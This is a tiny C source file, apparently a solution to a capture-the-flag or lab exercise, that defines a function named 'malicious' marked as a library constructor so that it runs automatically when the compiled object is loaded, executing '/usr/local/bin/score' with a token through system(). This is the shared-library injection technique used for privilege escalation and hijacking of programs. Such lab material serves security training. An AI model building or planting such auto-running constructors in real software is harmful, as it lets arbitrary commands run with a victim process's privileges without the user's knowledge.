#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score  acc10507-c94e-421f-bf7e-6c40ae4c1609o");
}
